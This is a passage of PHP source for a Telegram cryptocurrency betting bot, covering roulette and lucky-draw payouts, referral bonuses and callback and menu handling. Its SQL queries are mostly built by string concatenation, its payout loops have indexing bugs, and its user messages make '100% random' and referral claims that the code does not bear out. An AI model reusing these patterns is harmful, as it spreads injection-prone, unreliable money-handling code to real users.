            $sqadl = "SELECT balance FROM users WHERE tg_id = '" . $tg_id[$y] . "'";
            $ressds = mysqli_query($Conn, $sqadl);
            $row = mysqli_fetch_row($ressds);
            $bala = $row[0];
            $balaaa = $betamnt[$y];
            $balaaa = $balaaa + $balaaa;
            $balaa = $bala + $balaaa;

            $sqadsel = "UPDATE game_roulette SET winner = 1 WHERE tg_id = '" . $tg_id[$y] . "' AND bet_field = 'ODD' AND claim = 0";
            $ressddss = mysqli_query($Conn, $sqadsel);

            $sqadel = "UPDATE users SET balance = '" . $balaa . "' WHERE tg_id = '" . $tg_id[$y] . "'";
            $ressdss = mysqli_query($Conn, $sqadel);
            apiRequest("sendMessage", array('chat_id' => $tg_id[$y], "text" => '🎉 You have won ' . $balaaa . ' TRX'));
            $x++;
            $y++;
        }
    }
    //even
    if ($num == 2 || $num == 4 || $num == 6 || $num == 8 || $num == 10) {

        $sqadl = "SELECT tg_id, bet_amount FROM game_roulette WHERE bet_field = 'EVEN' AND claim = 0";
        $ressds = mysqli_query($Conn, $sqadl);
        $totnum = mysqli_num_rows($ressds);

        while ($row = mysqli_fetch_array($ressds)) {
            $tg_id[] = $row[0];
            $betamnt[] = $row[1];
        }

        while ($x <= $totnum) {
            $sqadl = "SELECT balance FROM users WHERE tg_id = '" . $tg_id[$y] . "'";
            $ressds = mysqli_query($Conn, $sqadl);
            $row = mysqli_fetch_row($ressds);
            $bala = $row[0];
            $balaaa = $betamnt[$y];
            $balaaa = $balaaa + $balaaa;
            $balaa = $bala + $balaaa;

            $sqadsel = "UPDATE game_roulette SET winner = 1 WHERE tg_id = '" . $tg_id[$y] . "' AND bet_field = 'EVEN' AND claim = 0";
            $ressddss = mysqli_query($Conn, $sqadsel);

            $sqadel = "UPDATE users SET balance = '" . $balaa . "' WHERE tg_id = '" . $tg_id[$y] . "'";
            $ressdss = mysqli_query($Conn, $sqadel);
            apiRequest("sendMessage", array('chat_id' => $tg_id[$y], "text" => '🎉 You have won ' . $balaaa . ' TRX'));
            $x++;
            $y++;
        }
    }
    //blue
    if ($num == 1 || $num == 2 || $num == 3 || $num == 7 || $num == 9) {

        $sqadl = "SELECT tg_id, bet_amount FROM game_roulette WHERE bet_field = 'BLUE' AND claim = 0";
        $ressds = mysqli_query($Conn, $sqadl);
        $totnum = mysqli_num_rows($ressds);

        while ($row = mysqli_fetch_array($ressds)) {
            $tg_id[] = $row[0];
            $betamnt[] = $row[1];
        }

        while ($x <= $totnum) {
            $sqadl = "SELECT balance FROM users WHERE tg_id = '" . $tg_id[$y] . "'";
            $ressds = mysqli_query($Conn, $sqadl);
            $row = mysqli_fetch_row($ressds);
            $bala = $row[0];
            $balaaa = $betamnt[$y];
            $balaaa = $balaaa + $balaaa;
            $balaa = $bala + $balaaa;

            $sqadsel = "UPDATE game_roulette SET winner = 1 WHERE tg_id = '" . $tg_id[$y] . "' AND bet_field = 'BLUE' AND claim = 0";
            $ressddss = mysqli_query($Conn, $sqadsel);

            $sqadel = "UPDATE users SET balance = '" . $balaa . "' WHERE tg_id = '" . $tg_id[$y] . "'";
            $ressdss = mysqli_query($Conn, $sqadel);
            apiRequest("sendMessage", array('chat_id' => $tg_id[$y], "text" => '🎉 You have won ' . $balaaa . ' TRX'));
            $x++;
            $y++;
        }
    }
    //red
    if ($num == 4 || $num == 5 || $num == 6 || $num == 8 || $num == 10) {

        $sqadl = "SELECT tg_id, bet_amount FROM game_roulette WHERE bet_field = 'RED' AND claim = 0";
        $ressds = mysqli_query($Conn, $sqadl);
        $totnum = mysqli_num_rows($ressds);

        while ($row = mysqli_fetch_array($ressds)) {
            $tg_id[] = $row[0];
            $betamnt[] = $row[1];
        }

        while ($x <= $totnum) {
            $sqadl = "SELECT balance FROM users WHERE tg_id = '" . $tg_id[$y] . "'";
            $ressds = mysqli_query($Conn, $sqadl);
            $row = mysqli_fetch_row($ressds);
            $bala = $row[0];
            $balaaa = $betamnt[$y];
            $balaaa = $balaaa + $balaaa;
            $balaa = $bala + $balaaa;

            $sqadsel = "UPDATE game_roulette SET winner = 1 WHERE tg_id = '" . $tg_id[$y] . "' AND bet_field = 'RED' AND claim = 0";
            $ressddss = mysqli_query($Conn, $sqadsel);

            $sqadel = "UPDATE users SET balance = '" . $balaa . "' WHERE tg_id = '" . $tg_id[$y] . "'";
            $ressdss = mysqli_query($Conn, $sqadel);
            apiRequest("sendMessage", array('chat_id' => $tg_id[$y], "text" => '🎉 You have won ' . $balaaa . ' TRX'));
            $x++;
            $y++;
        }
    }


    $sqadel = "UPDATE game_roulette SET claim = 1 WHERE claim = 0";
    $ressdss = mysqli_query($Conn, $sqadel);

    mysqli_close($Conn);
}

//LUCKY
function game_lucky1()
{

    $luckytier1 = 1;
    lucky1($luckytier1);
}
function game_lucky2()
{

    $luckytier2 = 5;
    lucky2($luckytier2);
}
function game_lucky3()
{

    $luckytier3 = 10;
    lucky3($luckytier3);
}

function lucky1($luckytier1)
{

    $Conn = database();

    $lotid = array();
    $tdgid = array();
    $tgfln = array();

    $x = 1;
    $xez = 1;
    $xz = 0;
    $y = 0;

    $sqasddl = "SELECT * FROM game_lucky WHERE claim = 0 AND tier = 1";
    $resscsdsds = mysqli_query($Conn, $sqasddl);
    $max = mysqli_num_rows($resscsdsds);

    if ($max >= 1) {

        $winner = rand(1, $max);
        $sqasddl = "SELECT tg_id FROM game_lucky WHERE claim = 0 AND tier = 1 AND lotid = '" . $winner . "'";
        $ressdsds = mysqli_query($Conn, $sqasddl);
        $row = mysqli_fetch_row($ressdsds);
        $tg_id = $row[0];

        $sqasddl = "SELECT tg_firstname FROM users WHERE tg_id = '" . $tg_id . "'";
        $ressdsds = mysqli_query($Conn, $sqasddl);
        $row = mysqli_fetch_row($ressdsds);
        $tg_fn = $row[0];

        $sqadl = "SELECT balance FROM users WHERE tg_id = '" . $tg_id . "'";
        $ressds = mysqli_query($Conn, $sqadl);
        $rowf = mysqli_fetch_row($ressds);
        $bala = $rowf[0];
        $balwin = $max * $luckytier1;
        $balwin = $balwin * 0.8;
        $bala = $balwin + $bala;

        $sqadel = "UPDATE users SET balance = '" . $bala . "' WHERE tg_id = '" . $tg_id . "'";
        $ressdss = mysqli_query($Conn, $sqadel);

        $sqalas = "UPDATE `game_lucky` SET winner = 1 WHERE tg_id = '" . $tg_id . "' AND claim = 0 AND tier = 1 AND lotid = '" . $winner . "'";
        $refsas = mysqli_query($Conn, $sqalas);

        $sqadsl = "SELECT tg_id FROM game_lucky WHERE claim = 0 GROUP BY tg_id";
        $resssds = mysqli_query($Conn, $sqadsl);
        $totnums = mysqli_num_rows($resssds);

        while ($rowe = mysqli_fetch_array($resssds)) {
            $tdgid[] = $rowe[0];
        }

        while ($xez <= $totnums) {

            apiRequest("sendMessage", array('chat_id' => $tdgid[$xz], 'parse_mode' => 'HTML', "text" => '▫ ' . $tg_fn . ' has won <code>' . $balwin . '</code> TRX

📊 <i>Winner ticket number is ' . $winner . '</i>'));

            $xz++;
            $xez++;
        }

        $sqals = "UPDATE `game_lucky` SET claim = 1 WHERE claim = 0 AND tier = 1";
        $refss = mysqli_query($Conn, $sqals);
    }
    mysqli_close($Conn);
    return null;
}

function lucky2($luckytier2)
{

    $Conn = database();

    $lotid = array();
    $tdgid = array();
    $tgfln = array();

    $x = 1;
    $xez = 1;
    $xz = 0;
    $y = 0;

    $sqasddl = "SELECT * FROM game_lucky WHERE claim = 0 AND tier = 2";
    $resscsdsds = mysqli_query($Conn, $sqasddl);
    $max = mysqli_num_rows($resscsdsds);

    if ($max >= 1) {

        $winner = rand(1, $max);
        $sqasddl = "SELECT tg_id FROM game_lucky WHERE claim = 0 AND tier = 2 AND lotid = '" . $winner . "'";
        $ressdsds = mysqli_query($Conn, $sqasddl);
        $row = mysqli_fetch_row($ressdsds);
        $tg_id = $row[0];

        $sqasddl = "SELECT tg_firstname FROM users WHERE tg_id = '" . $tg_id . "'";
        $ressdsds = mysqli_query($Conn, $sqasddl);
        $row = mysqli_fetch_row($ressdsds);
        $tg_fn = $row[0];

        $sqadl = "SELECT balance FROM users WHERE tg_id = '" . $tg_id . "'";
        $ressds = mysqli_query($Conn, $sqadl);
        $rowf = mysqli_fetch_row($ressds);
        $bala = $rowf[0];
        $balwin = $max * $luckytier2;
        $balwin = $balwin * 0.8;
        $bala = $balwin + $bala;

        $sqadel = "UPDATE users SET balance = '" . $bala . "' WHERE tg_id = '" . $tg_id . "'";
        $ressdss = mysqli_query($Conn, $sqadel);

        $sqalas = "UPDATE `game_lucky` SET winner = 1 WHERE tg_id = '" . $tg_id . "' AND claim = 0 AND tier = 2 AND lotid = '" . $winner . "'";
        $refsas = mysqli_query($Conn, $sqalas);

        $sqadsl = "SELECT tg_id FROM game_lucky WHERE claim = 0 GROUP BY tg_id";
        $resssds = mysqli_query($Conn, $sqadsl);
        $totnums = mysqli_num_rows($resssds);

        while ($rowe = mysqli_fetch_array($resssds)) {
            $tdgid[] = $rowe[0];
        }

        while ($xez <= $totnums) {

            apiRequest("sendMessage", array('chat_id' => $tdgid[$xz], 'parse_mode' => 'HTML', "text" => '▫ ' . $tg_fn . ' has won <code>' . $balwin . '</code> TRX

📊 <i>Winner user is digit number ' . $winner . '</i>'));

            $xz++;
            $xez++;
        }

        $sqals = "UPDATE `game_lucky` SET claim = 1 WHERE claim = 0 AND tier = 2";
        $refss = mysqli_query($Conn, $sqals);
    }
    mysqli_close($Conn);
    return null;
}

function lucky3($luckytier3)
{

    $Conn = database();

    $lotid = array();
    $tdgid = array();
    $tgfln = array();

    $x = 1;
    $xez = 1;
    $xz = 0;
    $y = 0;

    $sqasddl = "SELECT * FROM game_lucky WHERE claim = 0 AND tier = 3";
    $resscsdsds = mysqli_query($Conn, $sqasddl);
    $max = mysqli_num_rows($resscsdsds);

    if ($max >= 1) {

        $winner = rand(1, $max);
        $sqasddl = "SELECT tg_id FROM game_lucky WHERE claim = 0 AND tier = 3 AND lotid = '" . $winner . "'";
        $ressdsds = mysqli_query($Conn, $sqasddl);
        $row = mysqli_fetch_row($ressdsds);
        $tg_id = $row[0];

        $sqasddl = "SELECT tg_firstname FROM users WHERE tg_id = '" . $tg_id . "'";
        $ressdsds = mysqli_query($Conn, $sqasddl);
        $row = mysqli_fetch_row($ressdsds);
        $tg_fn = $row[0];

        $sqadl = "SELECT balance FROM users WHERE tg_id = '" . $tg_id . "'";
        $ressds = mysqli_query($Conn, $sqadl);
        $rowf = mysqli_fetch_row($ressds);
        $bala = $rowf[0];
        $balwin = $max * $luckytier3;
        $balwin = $balwin * 0.8;
        $bala = $balwin + $bala;

        $sqadel = "UPDATE users SET balance = '" . $bala . "' WHERE tg_id = '" . $tg_id . "'";
        $ressdss = mysqli_query($Conn, $sqadel);

        $sqalas = "UPDATE `game_lucky` SET winner = 1 WHERE tg_id = '" . $tg_id . "' AND claim = 0 AND tier = 3 AND lotid = '" . $winner . "'";
        $refsas = mysqli_query($Conn, $sqalas);

        $sqadsl = "SELECT tg_id FROM game_lucky WHERE claim = 0 GROUP BY tg_id";
        $resssds = mysqli_query($Conn, $sqadsl);
        $totnums = mysqli_num_rows($resssds);

        while ($rowe = mysqli_fetch_array($resssds)) {
            $tdgid[] = $rowe[0];
        }

        while ($xez <= $totnums) {

            apiRequest("sendMessage", array('chat_id' => $tdgid[$xz], 'parse_mode' => 'HTML', "text" => '▫ ' . $tg_fn . ' has won <code>' . $balwin . '</code> TRX

📊 <i>Winner user is digit number ' . $winner . '</i>'));

            $xz++;
            $xez++;
        }

        $sqals = "UPDATE `game_lucky` SET claim = 1 WHERE claim = 0 AND tier = 3";
        $refss = mysqli_query($Conn, $sqals);
    }
    mysqli_close($Conn);
    return null;
}





















function five_percent($tg_id, $amount)
{

    $Conn = database();

    $sql = "SELECT tg_inviter_id FROM users WHERE tg_id = '" . $tg_id . "'";
    $result = mysqli_query($Conn, $sql);
    $row = mysqli_fetch_row($result);
    $tg_inviter_id = $row[0];

    $sql = "SELECT `tg_id`, `balance` FROM users WHERE tg_referral_code = '" . $tg_inviter_id . "' limit 1";
    $result = mysqli_query($Conn, $sql);
    $result_row = mysqli_fetch_row($result);
    $inviter_tg_id = $result_row[0];
    $inviter_tbalance = $result_row[1];

    $fivePercent = $amount * 5;
    $fivePercent = $fivePercent / 100;
    $inviter_tbalance = $inviter_tbalance + $fivePercent;

    $sql = "UPDATE `users` SET `balance` = '" . $inviter_tbalance . "' WHERE `tg_id` = '" . $inviter_tg_id . "'";
    $result = mysqli_query($Conn, $sql);

    apiRequest("sendMessage", array('chat_id' => $inviter_tg_id, "text" => "🎁 You got '" . $fivePercent . "' TRX from affiliate system"));

    mysqli_close($Conn);
}









function processcallback($callback_query)
{

    $Conn = database();



    //DO NOT CHANGE PROCESS INCOMING CALLBACK_QUERY

    $tg_id = $callback_query['message']['chat']['id'];
    $tg_username = $callback_query['message']['chat']['username'];
    $callback_query_id = $callback_query['id'];
    $data = mysqli_real_escape_string($Conn, $callback_query['data']);
    $message_id = $callback_query['message']['message_id'];

    //CHANGE KEYBOARD TEXT HERE
    $main_keyboard = [
        ['🖥 Dashboard'],
        ['➕ Deposit', '➖ Withdraw'],
        ['🎮 Play Games 🎮'], ['❤‍🔥 Bonus', '📲 Invite'], ['📈 Statics', '📞 Support']
    ];

    $broadcast_keyboard = [
        ['💬 Show Broadcast'],
        ['✔️ Send Broadcast'],
        ['❌ Cancel Broadcast']
    ];

    $cancel_keyboard = [
        ['❌ Cancel']
    ];

    $game_keyboard = [
        ['🎰 5V5'],
        ['🎲 Roulette'],
        ['🍀 Lucky Spin'],
        ['🔝 Main Menu']
    ];

    //CHANGE THIS TO YOUR TELEGRAM CHANNEL USERNAME @CHANNEL_NAME
    $join_channel_username = "@TRX_Betting_Payments";
    $join_channel_username2 = "@TRX_Betting_Community";

    //ADD YOUR CHANNEL USERNAME AS https://t.me/channelName
    $join_channel_link = "https://t.me/TRX_Betting_Payments";
    $join_channel_link2 = "https://t.me/TRX_Betting_Community";

    //CHANGE THIS TO PRICE PER INVITE
    $invite_credit = 5;

    //BE CAREFUL HERE ONLY CHANGE DISPLAY TEXT ONLY (Check, Yes, No)
    $check_joined_channel = array(array(array("text" => "🔺 Check Membership 🔻", "callback_data" => "check_joined_channel")));
    $check_broadcast = array(array(array("text" => "Yes", "callback_data" => "yes_broadcast"), array("text" => "No", "callback_data" => "no_broadcast")));

    $sqadl = "SELECT status, game FROM users WHERE tg_id = '" . $tg_id . "'";
    $ressds = mysqli_query($Conn, $sqadl);
    $row = mysqli_fetch_row($ressds);
    $status = $row[0];
    $betnum = $row[1];

    if ($status == 61) {
        $sqjls = "INSERT INTO `game_roulette` (tg_id,bet_amount,bet_field) VALUES ('" . $tg_id . "','" . $betnum . "','" . $data . "') ";
        $rejss = mysqli_query($Conn, $sqjls);

        $sqls = "UPDATE `users` SET status = 0 WHERE tg_id = '" . $tg_id . "'";
        $rese = mysqli_query($Conn, $sqls);


        apiRequest("deleteMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "message_id" => $message_id));
        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Bet field added successfully !

▫ Bet Field: ' . $data));

        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '📲 <i>We will be notified soon !</i>', 'reply_markup' => array(
            'keyboard' => $game_keyboard,
            'one_time_keyboard' => false,
            'resize_keyboard' => true
        )));
    }

    if ($data === "check_joined_channel") {

        $sql = "SELECT start_status FROM users WHERE tg_id = '" . $tg_id . "' limit 1";
        $result = mysqli_query($Conn, $sql);
        $result_row = mysqli_fetch_row($result);
        $start_status = $result_row[0];

        if ($start_status == 0) {
            //USER HAS JOINED CHANNEL

            $check_channel = apiRequest("getChatMember", array('chat_id' => $join_channel_username, "user_id" => $tg_id));
            $user_channel_status = $check_channel['status'];

            $check_channel2 = apiRequest("getChatMember", array('chat_id' => $join_channel_username2, "user_id" => $tg_id));
            $user_channel_status2 = $check_channel2['status'];

            if ($user_channel_status == "member" || $user_channel_status == "creator" || $user_channel_status == "administrator") {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "▫️ Join our second channel to use our bot !"));
            } elseif ($user_channel_status == "left") {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "❌ You haven't join our pages !"));
            } elseif ($user_channel_status == "kicked") {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'You have been banned from the first channel!'));
            } else {
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🎮 Join our pages to use our bot :

▫ <a href='https://t.me/TRX_Betting_Payments'>@TRX_Betting_Payment 💰</a>

▫ <a href='https://t.me/TRX_Betting_Community'>@TRX_Betting_Community 🗣</a>

⛳ Click <b>🔻 Check Membership 🔺</b> button after you join our pages !", 'reply_markup' => array(
                    'inline_keyboard' => $check_joined_channel,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));
            }

            if ($user_channel_status2 == "member" && $user_channel_status == "member" || $user_channel_status2 == "creator" && $user_channel_status == "creator" || $user_channel_status2 == "administrator" && $user_channel_status == "administrator") {

                $sql = "UPDATE `users` SET `start_status` = 1 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);

                $sql = "SELECT tg_inviter_id FROM users WHERE tg_id = '" . $tg_id . "' limit 1";
                $result = mysqli_query($Conn, $sql);
                $result_row = mysqli_fetch_row($result);
                $tg_inviter_id = $result_row[0];

                $sql = "SELECT `tg_id`, `balance`, `referral_counter` FROM users WHERE tg_referral_code = '" . $tg_inviter_id . "' limit 1";
                $result = mysqli_query($Conn, $sql);
                $result_row = mysqli_fetch_row($result);
                $inviter_tg_id = $result_row[0];
                $balance = $result_row[1];
                $referral_counter = $result_row[2];
                $referral_counter = $referral_counter + 1;

                $sql = "UPDATE `users` SET `referral_counter` = '" . $referral_counter . "' WHERE `tg_id` = '" . $inviter_tg_id . "'";
                $result = mysqli_query($Conn, $sql);

                apiRequest("answerCallbackQuery", array('callback_query_id' => $callback_query_id, "show_alert" => true, "text" => '👋 Welcome to TRX Betting !'));

                apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🔝 Main Menu', 'reply_markup' => array(
                    'keyboard' => $main_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));

                apiRequest("sendMessage", array('chat_id' => $inviter_tg_id, "text" => "🍀 Your freind has joined our bot with your invitation link so you will get 10% from freind first deposit !"));
            } elseif ($user_channel_status2 == "left") {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "❌ You haven't join our pages !"));
            } elseif ($user_channel_status2 == "kicked") {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'You have been banned from the second channel !'));
            }
        }
    }

    if ($data === "yes_broadcast") {

        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Send the message you want to add'));

        $sql = "UPDATE `users` SET `status` = 5 WHERE tg_id = '" . $tg_id . "'";
        $result = mysqli_query($Conn, $sql);
    }

    if ($data === "no_broadcast") {

        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Click ✔️ Send Broadcast to Broadcast Message', 'reply_markup' => array(
            'keyboard' => $broadcast_keyboard,
            'one_time_keyboard' => false,
            'resize_keyboard' => true
        )));

        $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
        $result = mysqli_query($Conn, $sql);
    }

    if ($data === "log5v5") {

        $sqlews = "SELECT winner FROM game_5v5 WHERE tg_id = '" . $tg_id . "' ORDER BY id DESC";
        $resewe = mysqli_query($Conn, $sqlews);
        $totnum = mysqli_num_rows($resewe);

        $sqlews = "SELECT winner FROM game_5v5 WHERE tg_id = '" . $tg_id . "' AND winner = '1'";
        $resewe = mysqli_query($Conn, $sqlews);
        $totnumwin = mysqli_num_rows($resewe);
        if ($totnumwin < 1) {
            $totnumwin = 0;
        }


        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🎰 <b> My 5V5 Data Info :</b>

▫ Total Bet Won : <code>' . $totnumwin . '</code> times

▫ Total Bet Played : <code>' . $totnum . '</code> times'));
    }

    if ($data === "logroulette") {

        $sqlews = "SELECT bet_field, bet_amount FROM game_roulette WHERE tg_id = '" . $tg_id . "' ORDER BY id DESC";
        $resewe = mysqli_query($Conn, $sqlews);
        $row = mysqli_fetch_row($resewe);
        $totnum = mysqli_num_rows($resewe);
        $bet_field = $row[0];
        $bet_amount = $row[1];

        $sqlews = "SELECT winner FROM game_roulette WHERE tg_id = '" . $tg_id . "' AND winner = '1'";
        $resewe = mysqli_query($Conn, $sqlews);
        $totnumwin = mysqli_num_rows($resewe);
        if ($totnumwin < 1) {
            $totnumwin = 0;
        }


        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🎲 <b>Roulette Data Info :</b>

▫ Last Bet Field : ' . $bet_field . '

▫ Last Bet Amount : ' . $bet_amount . ' TRX

▫ Total Bet Won: ' . $totnumwin . ' times

▫ Total Bet Played: ' . $totnum . ' times'));
    }

    if ($data === "loglucky") {

        $sqlews = "SELECT lotid FROM game_lucky WHERE tg_id = '" . $tg_id . "' ORDER BY id DESC";
        $resewe = mysqli_query($Conn, $sqlews);
        $row = mysqli_fetch_row($resewe);
        $totnum = mysqli_num_rows($resewe);
        $lotid = $row[0];

        $sqlews = "SELECT winner FROM game_lucky WHERE tg_id = '" . $tg_id . "' AND winner = '1'";
        $resewe = mysqli_query($Conn, $sqlews);
        $totnumwin = mysqli_num_rows($resewe);
        if ($totnumwin < 1) {
            $totnumwin = 0;
        }


        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🍀 <b>Lucky Spin Data Info :</b>

▫ Last Bet Number: ' . $lotid . '

▫ Total Bet Won: ' . $totnumwin . ' times

▫ Total Bet Played: ' . $totnum . ' times'));
    }

    if ($data === "rules5v5") {

        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'The purpose of this game is to guess 5 digits numbers out of 5 numbers, where the ball stops !

You have to guess the numbers from 0 - 99, You can call 5 digits numbers. The game has a fixed bet amount based on tiers. Your lucky number consist of the bets.

<b>5v5 is spinning every 1 hour.</b>

🥇<i> Tier 1 bet amount is 1 TRX
🥈 Tier 2 bet amount is 5 TRX
🥉 Tier 3 bet amount is 10 TRX</i>

Bets outcome are divided by 5 types. Every bet matches some numbers and has its own payout rate. You can bet as many as you want !

🥇<b> Tier 1</b>
▫ Guess 1 out of 5 number - Win 2 TRX
▫ Guess 2 out of 5 number - Win 3 TRX
▫ Guess 3 out of 5 number - Win 4 TRX
▫ Guess 4 out of 5 number - Win 5 TRX
▫ Guess 5 out of 5 number - Win 6 TRX

🥈 <b>Tier 2</b>
▫ Guess 1 out of 5 number - Win 10 TRX
▫ Guess 2 out of 5 number - Win 15 TRX
▫ Guess 3 out of 5 number - Win 20 TRX
▫ Guess 4 out of 5 number - Win 25 TRX
▫ Guess 5 out of 5 number - Win 30 TRX

🥉 <b>Tier 3</b>
▫ Guess 1 out of 5 number - Win 20 TRX
▫ Guess 2 out of 5 number - Win 30 TRX
▫ Guess 3 out of 5 number - Win 40 TRX
▫ Guess 4 out of 5 number - Win 50 TRX
▫ Guess 5 out of 5 number - Win 60 TRX

<b>5v5 results are 100% random !</b>'));
    }

    if ($data === "rules") {

        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'The game purpose is to guess one of the 12 numbers, where the ball stops. Your lucky number consist of the bets.

<b>Roulette is spinning every 1 hour.</b>

Bets dividing by 4 types. Every bet matches some numbers and has own payout rate. You can bet as many as you want.

1. Bet on EVEN/ODD - 1:1 - Bet X 2
2. Bet on 🔴/🔵 - 1:1 - Bet X 2
5. Bet on Numbers (1-12) - 1:2 - Bet X 3
4. Bet on The Number 0 - 1:3 - Bet X 5

🎲 <b>Roulette results are 100% random !</b>'));
    }


    if ($data === "ruleslucky") {

        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'The purpose of this game is to test your luck. When a users submits a bet, He/She will be given a ticket according to the total users. The game has a fixed bet amount based on tiers. ONLY 1 lucky user will win, The payout will be the total users bet, 20% will be given to the bot 80% will be sent to the winner. The lucky user will be announced in 24 hours. You can bet as many as you want.

🍀 <b>Lucky is spinning every 24 hours.</b>

🥇<i> Tier 1 bet amount is 1 TRX
🥈 Tier 2 bet amount is 5 TRX
🥉 Tier 3 Bet amount is 10 TRX</i>

🥇 <b>Tier 1</b>
▫ If 10 users bet in these game, the lucky user will get 8 TRX
▫ If 20 users bet in these game, the lucky user will get 16 TRX
▫ If 100 users bet in these game, the lucky user will get 80 TRX
▫ If 1000 users bet in these game, the lucky user will get 800 TRX

🥈 <b>Tier 2</b>
▫ If 10 users bet in these game, the lucky user will get 40 TRX
▫ If 20 users bet in these game, the lucky user will get 80 TRX
▫ If 100 users bet in these game, the lucky user will get 400 TRX
▫ If 1000 users bet in these game, the lucky user will get 4,000 TRX

🥉 <b>Tier 3</b>
▫ If 10 users bet in these game, the lucky user will get 80 TRX
▫ If 20 users bet in these game, the lucky user will get 160 TRX
▫ If 100 users bet in these game, the lucky user will get 800 TRX
▫ If 1000 users bet in these game, the lucky user will get 8,000 TRX

📊 <i>The more user bet the more TRX will be rewarded  !</i>

🍀 <b>Lucky results are 100% random !</b>'));
    }
}

function processMessage($message)
{

    $Conn = database();



    //DO NOT CHANGE PROCESS INCOMING MESSAGE
    $text = mysqli_real_escape_string($Conn, $message['text']);
    $message_id = $message['message_id'];
    $tg_id = $message['chat']['id'];
    $tg_id = $message['chat']['id'];
    $tg_username = $message['chat']['username'];
    $tg_firstname = $message['chat']['first_name'];
    $tg_lastname = $message['chat']['last_name'];

    $sql = "SELECT `status`, `start_status`, `balance`, `last_transaction`, `admin`, `referral_counter`, `amount`, `walletAddress`, `warning`, `ban` FROM `users` WHERE tg_id = '" . $tg_id . "' limit 1";
    $result = mysqli_query($Conn, $sql);
    $result_row = mysqli_fetch_row($result);
    $status = $result_row[0];
    $start_status = $result_row[1];
    $balance = $result_row[2];
    $last_transaction = $result_row[3];
    $admin = $result_row[4];
    $referral_counter = $result_row[5];
    $amount = $result_row[6];
    $walletAddress = $result_row[7];
    $warning = $result_row[8];
    $ban = $result_row[9];

    if ($admin == 1) {
        $main_keyboard = [
            ['🖥 Dashboard'],
            ['➕ Deposit', '➖ Withdraw'],
            ['🎮 Play Games 🎮'], ['❤‍🔥 Bonus', '📲 Invite'], ['📈 Statics', '📞 Support'], ['⚙️ Admin']
        ];

        $admin_keyboard = [
            ['💬 Broadcast Message'],
            ['🔖 Send Message'],
            ['🔑 Change Private Key'],
            ['🔝 Main Menu']
        ];
    } else {
        $main_keyboard = [
            ['🖥 Dashboard'],
            ['➕ Deposit', '➖ Withdraw'],
            ['🎮 Play Games 🎮'], ['❤‍🔥 Bonus', '📲 Invite'], ['📈 Statics', '📞 Support']
        ];
    }

    $broadcast_keyboard = [
        ['💬 Show Broadcast'],
        ['✔️ Send Broadcast'],
        ['❌ Cancel Broadcast']
    ];

    $cancel_broadcast = [
        ['❌ Cancel Broadcast']
    ];

    $continue_keyboard = [
        ['✅ Confirm'],
        ['❌ Cancel']
    ];

    $deposit_keyboard = [
        ['✅ Verify Deposit'],
        ['❌ Cancel']
    ];

    $cancel_keyboard = [
        ['❌ Cancel']
    ];

    $game_keyboard = [
        ['🎰 5V5'],
        ['🎲 Roulette'],
        ['🍀 Lucky Spin'],
        ['🔝 Main Menu']
    ];

    $game_5v5_keyboard = [
        ['🎰 Start 5V5'],
        ['🎮 Play Games 🎮'],
        ['🔝 Main Menu']
    ];

    $v5tier_keyboard = [
        ['🎰 5V5 Tier 1'],
        ['🎰 5V5 Tier 2'],
        ['🎰 5V5 Tier 3'],
        ['🔝 Main Menu']
    ];

    $game_roulette_keyboard = [
        ['🎲 Start Roulette'],
        ['🎮 Play Games 🎮'],
        ['🔝 Main Menu']
    ];

    $game_lucky_keyboard = [
        ['🍀 Start Lucky'],
        ['🎮 Play Games 🎮'],
        ['🔝 Main Menu']
    ];

    $luckytier_keyboard = [
        ['🍀 Lucky Tier 1'],
        ['🍀 Lucky Tier 2'],
        ['🍀 Lucky Tier 3'],
        ['🔝 Main Menu']
    ];


    //ADD YOUR CHANNEL USERNAME AS https://t.me/channelName
    $join_channel_link = "https://t.me/TRX_Betting_Payments";
    $join_channel_link2 = "https://t.me/TRX_Betting_Community";

    //CHANGE THIS TO YOUR TELEGRAM CHANNEL USERNAME @CHANNEL_NAME
    $join_channel_username = "@TRX_Betting_Payments";

    //BE CAREFUL HERE ONLY CHANGE DISPLAY TEXT ONLY (Join, Transaction ID, Check, Yes, No)
    $join_channel = array(array(array("text" => "Join", "url" => $join_channel_link)));
    $join_channel2 = array(array(array("text" => "Join", "url" => $join_channel_link2)));
    $transaction_id = array(array(array("text" => "Transaction ID", "callback_data" => "transaction_id")));
    $check_joined_channel = array(array(array("text" => "🔺 Check Membership 🔻", "callback_data" => "check_joined_channel")));
    $check_broadcast = array(array(array("text" => "Yes", "callback_data" => "yes_broadcast"), array("text" => "No", "callback_data" => "no_broadcast")));

    //CHANGE THE THRESHOLD
    $withdraw_threshold = 0.01;
    $referral_threshold = 3;

    $v5tier1 = 1;
    $v5tier2 = 5;
    $v5tier3 = 10;

    $luckytier1 = 1;
